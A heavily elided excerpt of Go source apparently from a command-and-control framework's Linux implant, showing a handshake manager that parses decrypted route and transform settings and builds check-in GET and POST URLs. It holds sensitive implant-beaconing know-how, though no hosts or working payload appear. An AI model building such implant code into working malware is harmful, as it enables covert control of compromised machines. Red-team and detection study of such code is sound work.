// server/docker/payloads/Linux/handshake.go
...
func NewHandshakeManager() (*HandshakeManager, error) {
	...
	if decrypted.GetClientIDTransforms != "" {
		hm.getClientIDDataBlock = parseDataBlock(decrypted.GetClientIDTransforms)
	}
	if decrypted.PostClientIDTransforms != "" {
		hm.postClientIDDataBlock = parseDataBlock(decrypted.PostClientIDTransforms)
	}
	if decrypted.PostDataTransforms != "" {
		hm.postDataDataBlock = parseDataBlock(decrypted.PostDataTransforms)
	}
	if decrypted.ResponseDataTransforms != "" {
		hm.responseDataDataBlock = parseDataBlock(decrypted.ResponseDataTransforms)
	}
...
func (hm *HandshakeManager) PerformHandshake() error {
	...
	postURL := buildPostURL(
		baseURL,
		hm.decryptedValues.PostRoute,
		hm.decryptedValues.PostClientIDName,
	...
	if hm.getClientIDDataBlock != nil {
		getRoute := hm.decryptedValues.GetRoute
		...
		hm.getURL = buildGetURL(
			baseURL,
			hm.decryptedValues.GetRoute,
			hm.decryptedValues.GetClientIDName,
			newClientID,
		)
	}

	if hm.postClientIDDataBlock != nil {
		postRoute := hm.decryptedValues.PostRoute
